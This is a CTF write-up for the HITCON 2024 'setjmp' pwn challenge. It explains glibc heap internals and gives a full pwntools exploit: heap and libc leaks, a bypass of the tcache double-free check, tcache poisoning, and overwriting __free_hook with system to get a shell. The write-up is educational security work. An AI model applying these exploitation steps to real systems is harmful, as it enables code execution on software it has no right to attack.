---
title: "Setjmp - HITCON CTF 2024 Quals"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "rop", "heap", "tcache", "fastbin", "unsorted-bin", "use-after-free", "free-hook", "aslr", "scanf", "pivoting", "hitcon-ctf-2024-quals", "2024", "ctf-writeup"]
summary: "setjmp [230pts] by nella17"
source:
  name: "CTFtime writeup #39355"
  url: "https://ctftime.org/writeup/39355"
original_source: "https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html"
ctf:
  name: "HITCON CTF 2024 Quals"
  year: 2024
  challenge: "Setjmp"
---

## Metadata

- **CTF:** HITCON CTF 2024 Quals
- **Task:** Setjmp
- **Author team:** qsec
- **CTFtime:** <https://ctftime.org/writeup/39355>
- **Original writeup:** <https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html>

---
*Task description*  
```txt  
setjmp [230pts] by nella17

setjmp, longjmp - performing a nonlocal goto  
nc [setjmp.chal.hitconctf.com](http://setjmp.chal.hitconctf.com) 1337  
<https://storage.googleapis.com/hitcon-ctf-2024-qual-attachment/setjmp/setjmp-eb24f3fa7ace97180f8af895e3858ede02697f5d.tar.gz>  
```

\----

*Writeup Author: Tom Mansion aka [philipp0x90](<https://ctftime.org/user/198580)*>

This challenge was a classic heap exploitation challenge running on GLIBC 2.31. The tricky part was getting a leak of a libc pointer but we managed to solve this using the `scanf()` function to force a big allocation to be made.  
In this blogpost, we will start by giving the reader a bit of context on heap exploitation and glibc internals. We will then tackle the challenge itself and how we solved it.

If you want to try this challenge yourself, here is a link to the binary, Dockerfile, and our solution: [setjmp.tar.gz](<https://blog.quarkslab.com/resources/2024-07-22_hitconctf-writeup-setjmp/setjmp.tar.gz>)

# GLIBC malloc internals primer  
Before diving into the details of our exploit, let's take the time to explain a few structures internal to malloc and the basic blocks of the glibc heap implementation. For more details, please visit the following links:

* [Azeria Labs malloc internals](<https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/>)  
* [Shellphish's how2heap, excellent resource](<https://github.com/shellphish/how2heap>)  
* [A series of blog posts on heap exploitation](<https://heap-exploitation.dhavalkapil.com/>)  
* [Malloc Des Malificarum, old but sometimes relevant](<http://phrack.org/issues/66/10.html>)

## What is the heap  
The heap is an area within a process's virtual memory space that serves dynamic memory allocations. It is mapped into memory once the first allocation is made by the program through a call to `malloc()`, and can be extended when the program consumes all the memory it can serve.  
Memory allocations can then be de-allocated with a call to `free()`, giving back the memory to the allocator so it can reuse it for further operations.

When the user (meaning the user of the `malloc` API call) requests some memory, they specify a size and the allocator will return a pointer to a block of memory that is at least as large as the requested size. This block is what we call a chunk.  
There are three different types of chunks:

* Allocated chunks  
* Free chunks  
* The top chunk (or wilderness)

All chunks consist of a header of 0x10 bytes and a body of varying size. The combined length of a chunk's header and body should be aligned on 0x10 bytes (on 64-bit platforms). The header of a chunk looks like this:

![Malloc Header](<https://blog.quarkslab.com/resources/2024-07-22_hitconctf-writeup-setjmp/malloc_header_transparent.png>)

The three least significant bits of the `size` field (`A|M|P`) in the header hold some useful information for the allocator but we will omit these details.

When it is born, the heap of a program contains only the top chunk, and this chunk is split into smaller ones to satisfy allocation requests.  
This is done in a linear fashion, the first chunk of memory that is requested will precede the second one, and so on.  
Ideally, we would like to return freed chunks to the wilderness, this is done by increasing the size of the wilderness in its header. This way, upon the next allocation, the top chunk will be split again and a small chunk of it will be returned to the user.

```  
\--------- size <\- Chunk 0  
|  
\--------- size <\- Chunk 1  
|  
\--------- size <\- Top chunk  
|   
```

The problem is, what happens when there are two consecutive chunks in use and only the first one (Chunk 0) is freed? Then we can't simply return it to the wilderness because it isn't adjacent to it so we need another mechanism to mark it as free and **reusable** (otherwise what's the point of freeing chunks).

This is where the freelists come in. In GLIBC, they're called bins, they exist in five different flavors and are used for different purposes:

**Small bins**

Doubly linked lists that store chunks up to 1024 bytes. There are 62 small bins, each holding chunks of a specific size so they remain sorted at all times.  
  
**Large bins**

Doubly linked lists to store chunks of size greater than 1024. There are 63 large bins and each bin holds chunks in a certain size **range** so they have to be kept sorted for fast access/retrieval.

**The unsorted bin**

Another doubly linked list that is used as a cache layer. Chunks that don't fit into the tcache or fastbins get stored here when they are freed and are put into the appropriate (small/large) bins later. 

**Fast bins**

Singly linked lists to store small chunks (<88 bytes) that are going to be reused soon. There are 10 fast bins that each store chunks of one size so they are always sorted.

**tcache bins**

Another optimization on top of the fastbins. They act exactly like the fastbins but are local to each thread (performing actions on other bins requires acquiring a mutex) so they are much faster to use. There are 64 tcache bins that each hold a maximum of 7 free chunks of size 24 to 1032 bytes.

\---

When a chunk is freed and cannot be placed back into the top chunk, it is placed in one of the bins and waits to be allocated again. The allocator will prioritize allocating chunks from the bins instead of the top chunk to reuse memory as often as possible. In a nutshell, chunks are placed into bins with the following strategy (simplified view that ignores consolidation):

1\. If there is a tcache bin that fits the size, put it there.  
2\. If the tcache bin for that size is full, put it in a fastbin.  
3\. If the chunk doesn't fit a fastbin, put it in the unsorted bin and sort it during a subsequent call to malloc.

Almost all of the heap exploitation techniques rely on one thing: messing with these free lists. This is possible because, for optimization reasons, the developers of malloc decided to store the pointers to the next and previous chunks in free lists inside the chunks themselves. 

Let us see what a free chunk's header and contents look like.

![Free chunk](<https://blog.quarkslab.com/resources/2024-07-22_hitconctf-writeup-setjmp/free_chunk.png>)

We can see that the "user data" of a chunk is reused once it is freed. When a chunk is freed and put into a bin, the allocator links it together with other chunks in the bin and fills in these fwd and bck pointer fields. The lists are traversed by first reading the address of the head of the list (this is a variable in the libc's data section), then reading the contents of each chunk in the bin to get a pointer to the next chunk.

So, if a user can modify the contents of a chunk after it has been freed, they can mess with the forward and backwards pointers of a node in one of the bins. This is what we call a Use After Free vulnerability.  
Now that we understand how GLIBC's memory allocator allocates and frees chunks, we can start talking about how to abuse it.

## Heap exploitation primitives  
Vulnerabilities in programs lead to these three classes of exploitation primitives that can be leveraged in different ways.  
### Heap overflow  
This is a simple case of overflowing a buffer. An attacker with this primitive can modify the headers or contents of subsequent chunks or modify the bin list pointers of subsequent **free** chunks.  
### Use After Free  
This primitive happens when the developer of a program keeps a reference to a chunk that has been freed. If the attacker can still read the contents of a chunk after it has been freed, they can leak important information such as heap addresses or even an address inside of libc. If the attacker can write into the chunk, they can also modify the bin list pointers.  
A good example of a leak that can be performed using a UAF vulnerability is leaking a libc address from a doubly linked bin. The unsorted bin is a doubly linked list, but where is the list head stored? In libc! If an attacker manages to get a chunk in the unsorted bin and can use a UAF to read its contents, they are able to read the forward and backward pointers of this unsorted chunk. If this chunk is the first element in the unsorted bin, its backward pointer is effectively a pointer to a libc address, at a known offset! Once the attacker leaked this value, they can calculate the base address of libc, thus breaking ASLR. This is a very useful trick as it's quite easy to get code execution once you know the base address of libc.  
### Double-free  
This one is a bit harder to understand. It is a variant of the UAF primitive where an attacker can perform the free operation twice on a chunk. This is a powerful primitive that has been mitigated over time but is still possible to use. The idea is that if you free a chunk twice, it will be present two times in a bin. On a subsequent allocation, you will get a pointer to this chunk and it will be considered both in use and free. If you modify the contents of the chunk at this point, you also modify the bin list pointers of the chunk.  
### Why modify bin list pointers?  
The goal is often to craft fake chunks. If you can modify the forwards and backward pointers in a free chunk, you essentially control the location of the next allocation. This gives you a write-what-where, or arbitrary write primitive. Depending on the program, you can also sometimes turn it into an arbitrary read primitive. With these primitives and the possibility of leaking a libc address, it is possible to hijack the program's control flow and gain code execution.  
### How to gain code execution?  
There are many ways to gain code execution from heap exploitation primitives but I will only explain the easiest one, in my opinion, using malloc hooks (this only works on GLIBC <= 2.33).  
GLIBC's malloc implementation provides different API calls to the user. The most common ones are `malloc()`, `free()`, `realloc()`, `calloc()` but they all come with their hook counterparts.  
A hook is a location in libc's data section that is initially full of 0s that the user of a program can overwrite to execute code before the regular API calls are processed. It is a debug feature that has since been moved to another library because it is such a good exploitation vector.  
This can, of course, be leveraged by an attacker to gain arbitrary code execution. If the attacker can leak the address of libc and has an arbitrary write primitive, they can write the address of another function in one of the hooks and execute it when the hook is called. The easiest way to get a shell this way is to write the address of the `system()` function of the libc at the address of the `__free_hook`. The `system()` function takes one argument, a pointer to a string, and when the `__free_hook` is executed, the argument to `free()` will be passed to `system()`. If you can allocate a chunk and place the string `/bin/sh` in it, calling `free` on that chunk will effectively call `system("/bin/sh")` and you will get a shell.

### Side-note: pivoting around memory  
On programs that use a more recent version of libc, it is no longer possible to use the malloc hooks trick to gain code execution. In those cases, the exploit developer has to be a bit more creative to leverage their heap-based vulnerabilities into code execution. For example, they can craft a fake chunk that lands on the stack, and overwrite a return address with a ROP chain. But how do you know where the stack is located? [This article](<https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/>) written by Nick Gregory explains how one can get leaks of addresses from different memory regions (when you have an arbitrary read primitive). We already covered the first step of leaking a libc address, but once you are there, it is possible to get leaks for the rest of the program as well. This figure from the article illustrates the different paths one can take to get such leaks.

![Pivoting around memory](<https://blog.quarkslab.com/resources/2024-07-22_hitconctf-writeup-setjmp/mem_region_pivoting.png>)  
ref: [<https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/>](<https://blog.osiris.cyber.nyu.edu/2019/04/06/pivoting-around-memory/>)

# Challenge setup  
We were given a binary and a Dockerfile so we knew on which system/version of libc this challenge was run. It used GLIBC 2.31 which implements a double-free detection in the tcache but not yet pointer protection (which will be implemented in GLIBC 2.32).

The first step was to run the container and extract the libc to have the exact same version they were using. Then you had to patch the binary to set its `RPATH` property to use that version instead of your system's libc.  
I used [`pwninit`](<https://github.com/io12/pwninit>) for that purpose.

```python  
#!/usr/bin/python3  
from pwn import *

process_name = "./chal_patched"  
libc_name = "./libc.so.6"

p = remote("[setjmp.chal.hitconctf.com](http://setjmp.chal.hitconctf.com)", 1337)  
elf = ELF(process_name)  
libc = ELF(libc_name)

# Helper function definitions  
```

# General understanding  
This challenge was using `setjmp/longjmp` which are non-local gotos. These two functions go together, you set up a jump location with `setjmp(jmp_buf env)`, passing a buffer as an argument that will be used to store the execution context, and the function returns `0`. You can then call `longjmp(jmp_buf env, int val)` to jump back to the `setjmp` call where the buffer was set. The `val` argument you pass to the function will determine the return value of the `setjmp` once we jump back to it.  
  
The program used `setjmp`/`longjmp` to jump around the code, for example in the menu function that we will discuss later, the user is prompted to select an action. The integer representing the action is then passed to a call to `longjmp` and the corresponding return value of the `setjmp` call is used in a switch statement.

The context saving before the switch statement:  
```c  
choice = _setjmp(saved_env_switch); // Here we set the buffer that will be used for saving/restoring the context  
switch(choice) {  
case 0:  
longjmp(saved_env_menu,1); // Jump to the menu (the corresponding setjmp has been called before we reach this)  
case 1:  
longjmp(saved_env_main_1,1); // Jump to the beginning of the program and perform the reset  
case 2:  
new_user(current_user);  
break;  
case 3:  
del_user(current_user);  
break;  
case 4:  
change_pass(current_user);  
break;  
case 5:  
view_users(current_user);  
break;  
default:  
exit(0);  
}  
```

The menu function:  
```c  
void menu(void)

{  
int iVar1;  
  
saved_env_menu = (__jmp_buf_tag *)malloc(200);  
iVar1 = _setjmp(saved_env_menu);  
if (iVar1 != 0) {  
puts("---- menu ----");  
puts("[1] restart");  
puts("[2] new user");  
puts("[3] del user");  
puts("[4] change pass");  
puts("[5] view users");  
puts("[6] exit");  
iVar1 = get_choice("> ");  
longjmp(saved_env_switch,iVar1); // Here we jump to the _setjmp call that set this buffer  
}  
return;  
}  
```

The exploitation part had nothing to do with that but it was interesting to see how these jumps were implemented.

The challenge itself was a basic heap exploitation challenge where you had alloc/free/modify/leak primitives but they were quite constrained.

When executing the binary, you were presented with a menu that allowed you to create, delete, change, and view users.

You could also trigger a "restart", which would jump back to the beginning of the program (using longjmp) and create a new "root" user with username == password == "root".

When doing this, the program would not free/delete any of the previous nodes and it was quite handy to use whenever you messed up the list.

```  
\---- menu ----  
[1] restart  
[2] new user  
[3] del user  
[4] change pass  
[5] view users  
[6] exit  
```

The program maintained a doubly linked list of users and updated the list head every time you created a new user. So the list head always pointed to the last created user.

It would not update the list head upon user deletion, just the forward and backward pointers inside the nodes.

Users were stored in the heap, in a size `0x20` struct that looked like this:  
```c  
struct user {  
char[8] username;  
char[8] password;  
struct user* previous;  
struct user* next;  
}  
```

# Vulnerabilities  
## UAF  
When the list was only one element long and you deleted the current user, the program would keep a reference to the user in the stack, giving us a Use After Free vulnerability.

One could then use the change password function to overwrite 8 bytes at `&current_user+8`. We used this to mess with the tcache to bypass its double-free detection mechanism.

## Double-free  
Same as the previous one, you could use the UAF to trigger a double-free by deleting a user twice.

# Exploitation & GLIBC caveats  
The basic idea was to get a double-free in the tcache to get an arbitrary read/write into libc.

We used the classic trick of overwriting `__free_hook` in the libc with the address of `system()`.

We could then create a user with username "/bin/sh" and free it, this would trigger the `__free_hook` and call `system(/bin/sh)` to give us a shell.

## Leaks needed  
We, of course, needed a leak of the libc base address to be able to calculate the offsets to the symbols we needed.

We also needed a heap base address leak to be able to guess heap addresses.

## GLIBC 2.31 protections  
There is a double-free detection in the tcache on this version of libc. The way it works is that since the tcache is a singly linked list of free chunks, the allocator can store something in the prev field of the chunk because it is unused. When freeing a tcache-sized chunk, the allocator links the tcache chunks together and stores the address of the next free chunk in the next field of the chunk (the first 8 bytes of the "user data" of the chunk). Right next to it, it stores the base address of the heap. At this address is stored the `tcache_struct` which holds the list heads and counts for all the tcache bins. This is different from the other bins which hold their list heads inside of the libc's data section. The tcache tries to promote data locality for faster access so it stores its metadata on the heap itself.

So, the contents of a free tcache chunk look like this:  
```c  
// The header of the chunk lies here but we don't care about that.  
struct tcache_entry {  
uint64_t* next;  
uint64_t* tcache_key; // Pointer to the tcache_struct (==to the base of the heap)  
}  
```  
When freeing a chunk for the first time, the allocator links it with the other chunks in the same-sized tcache bin and writes the address of the `tcache_struct` in the `tcache_key` field of the free chunk.

When freeing it for the second time, the allocator reads the `tcache_key` pointer in the free chunk. If it is equal to the address of the `tcache_struct`, it finds the list head for the appropriate bin and then traverses the list to see if the pointer we are just now freeing is already present in the list. If it finds it, the program crashes.

It is possible to bypass this protection if we can use a UAF vulnerability to overwrite the `tcache_key` in a free chunk. This is exactly the vulnerability that we have with the UAF on the `password` field of a user. If we modify just one byte of this pointer, it is then not equal to the address of the `tcache_struct` and the check is passed because the allocator doesn't consider this chunk as free.

## 1. Heap leak  
It is very easy to get a heap leak from this program. We start the program, it then has one user in its list. We delete this user, causing the program to call `free`, and then use the `view_users` command to leak the contents of the free chunk. The "password" field contains the `tcache_key` which gives us our heap leak.

```python  
# 1. get heap leak  
del_user(b"root")  
view_users()  
p.recvuntil(b": ")  
heap_leak = unpack(p.recvline().strip(), "all")  
print(f"heap base {heap_leak=:#x}")  
```

## 2. Libc leak  
A common technique to get a libc leak is to free a big chunk (>0x400 bytes) so it gets put into the unsorted bin. The unsorted bin is a cache layer in the glibc allocator that is used to temporarily hold freed chunks before putting them in their appropriate bins (small, large, fast, or tcache). The unsorted bin is a doubly linked list and its list head is stored in the libc's data section. When we free a chunk into the unsorted bin for the first time, its backward pointer then points into the libc, at a known offset. If we can read this pointer, we leak the base address of libc.

The problem is that we do not control the size of allocations in this program. Users are only `0x20` bytes and that size corresponds to the tcache or fastbin. So it is impossible to get a user into the unsorted bin by freeing it.

There are multiple ways we can bypass this, one way would be to exploit a double-free vulnerability to get an arbitrary chunk that overlaps with another chunk's header, this way we could modify it to make the allocator think it is a big chunk and place it in the unsorted bin upon freeing it.

This way is not very elegant as it requires us to make one more double-free, as well as messing with the heap's internal structure. There are checks that are made upon freeing a chunk that are bypassable but they require us to make many allocations.

Another way that is way more elegant is to use the `scanf` function to make allocations for us. In our program, `scanf("%d, choice)` is called in the menu, when the user is asked to make a choice.

Indeed, when a program uses `scanf`, it needs to store the user's input in a buffer and that buffer is usually on the heap (unless the programmer provides their own buffer with `setbuf/setvbuf`). If we give a big enough input to `scanf`, it will allocate a big buffer on the heap and free it before returning. We can utilize this to our advantage by providing an input that is large enough to be placed on the unsorted bin.  
The problem is that when you make an allocation (however big it is) if it borders the top chunk (also called the wilderness) of the heap, it is placed back into the wilderness when deallocating it. One way to prevent this is by placing a "guard chunk" between our big allocation and the wilderness by allocating another chunk after allocating the big one without freeing it. This prevents the allocator from returning the big chunk to the top of the heap, thus placing it in a bin.

However, we cannot do that as the allocation/deallocation happens within the scanf function and we don't have a way to interrupt it. So how will we force this `scanf` chunk to be placed into a bin?

```  
\-------------- <\- big chunk of size > 0x400  
|  
|  
|  
|  
|  
\-------------- <\- guard chunk  
|  
\-------------- <\- top chunk  
```

We can use `malloc_consolidate()`! This function is triggered whenever the fastbins hold some chunks and a big allocation is made. Fastbin chunks are actually never considered truly free by the allocator so it needs to call this function periodically in order to truly free them and avoid losing memory. To truly free them means to put them into the unsorted bin, which will eventually be emptied by promoting the chunks it holds to smallbins or tcache bins.

So if we fill up the fastbin for size 0x30 (0x20 for a user + 0x10 for its header), before giving a large input to `scanf`, we can force their consolidation and put them into the unsorted bin!

We can put some free chunks in the fastbin by filling up the tcache bin first, which can only hold 7 elements, and then freeing some more chunks to get them into the fastbin.

After that, we simply need to create a new user with an empty username (after exhausting the tcache'd chunks), this way we don't overwrite the libc pointer that was stored in the free unsorted bin chunk, view the users and we get our libc leak.

```python  
# 2. libc leak  
# Put some chunks into the fastbin, trigger a scanf on a big input to call malloc_consolidate()  
for i in range(30):  
create_user(f"test{i}", b"test")

for i in range(30):  
del_user(f"test{i}")

restart()

trigger = "0"*0x500

p.sendlineafter(b"> ", trigger)

# exhaust tcache bins  
for i in range(5):  
create_user(f"trash{i}", b"useless")

# allocate straight from unsorted bin  
create_user(b"", b"")  
view_users()

# Little bit of a dirty trick because create_user uses sendlineafter so we overwrite one byte with 0x0a.  
leak2 = p.recvuntil(b":").strip(b":").replace(b"\x0a", b"\xe0")   
libc.address = unpack(leak2, "all") - 0x1ecbe0  
print(f"{libc.address=:#x}")  
```

## 3. Final exploit  
Now that we have our libc and heap leaks, it's time for the final exploit. We want to forge a fake chunk that points to libc's `__free_hook`, and overwrite it with the address of system.

To do so, we have to bypass the double-free check on the tcache for this version of glibc which we explained earlier. 

In practice, we first call the restart function to begin with a sane user list. Our list now has one element, the root user. Then we create and delete one user (let's call it "fill") to have one element in the tcache list (useful later because the double-free messes with the count for the tcache bin). Now our tcache bin count is at one and we can start the exploit.

We then delete the root user, the tcache has two elements in it and a count of 2. We also keep a reference to the root user because there was only one element in the list.

When the root user is free'd, its username changes because of the linking in the tcache. The username field is reused to store the next pointer in the tcache (the address of "fill"). This is why we needed our heap leak because the `delete_user` function takes the username as an argument and traverses the user list until it finds a user with the appropriate username. If we want to free this node again, we need to know the address that will be stored in the username field and we can now calculate it based on the heap base address because heap allocations are deterministic so the offset from the base to the "fill" user will always be the same.

Now, we have to use the UAF vulnerability to modify the root user's `tcache_key` field. We do so by using the `change_password` function. We just want to overwrite the pointer with some junk.

This sets us up for the double-free, we can now free the root user again by providing the address of the "fill" user as a username.

We now have three elements in the tcache bin: "root" -> "root" -> "fill".

When we allocate the next user, the "root chunk" will both be allocated and free from the allocator's point of view.

We allocate the next user and provide the address of `__free_hook` as its username. This will cause the second next chunk we allocate to point to the address of `__free_hook`. Our tcache is now poisoned.

We allocate one more user to consume one tcache element (we get a chunk at the address of "root" one more time because the tcache list head now points to this address). This is where allocating the "fill" user makes sense. If we didn't allocate that user before, the tcache bin's count would now be 0 (freeing "root" for the second time didn't update the count) so the next chunk we would allocate wouldn't come from the tcache.

Finally, we allocate a user with the address of `system()` as its username, causing us to write into the `__free_hook` of libc. `malloc()` returns a pointer to `__free_hook` and the `create_user()` function writes into it. 

Now we allocate one more user and name it `/bin/sh`.

We can then free this user and the `__free_hook` is called upon freeing, giving us a shell :)

```python  
# 3. Perform double free with tcache poisoning.  
# For this, we need to have one chunk in the user list, free it once, modify its password to modify the tcache key and prevent the double free detection. Then we can get an arbitrary chunk.

restart() # start again with a sane list.  
# create and delete a user so we have one element in the tcache already. List head will then be at root  
view_users()  
print("[+] About to delete new root user")

# Update the tcache count before the double free  
create_user(f"fill", b"fill")  
del_user(f"fill")

print("[*] About to delete root user")  
del_user(b"root")  
print("[+] deleted root user, about to attempt change pass. We need to know the new username of root, which is a heap address bc its in the tcache")  
print(f"[*] root user's new username: {heap_leak+0xa20:#x}")  
# Change the root user's password to overwrite tcache_entry->tcache_key  
p.sendlineafter(b"> ", b"4")  
p.recvuntil(b"username > ")  
p.send(p64(heap_leak + 0xa20))  
p.recvuntil(b"password > ")  
p.sendline(b"A") # We do this to avoid double free detection with chunk->key

del_user(p64(heap_leak + 0xa20))

# Now we have a double free in the tcache. We want to allocate a new user and set its username to whatever address we want our next chunk to be in. Then we alloc a new user and write to that address.  
print("[+] about to create a new user, this will poison the tcache")  
create_user_clean(p64(libc.symbols["__free_hook"]), b"A")

# Consume one element in the tcache, this chunk will point to the old root user again.  
create_user(b"no_need", b"filler")  
print("[+] About to create new user to write into __free_hook")  
create_user_clean(p64(libc.symbols["system"]), b"A")

print("[+] about to create user /bin/sh")  
create_user(b"/bin/sh", b"yesman")  
print("[+] about to delete user /bin/sh")  
del_user(b"/bin/sh")

p.interactive()  
```
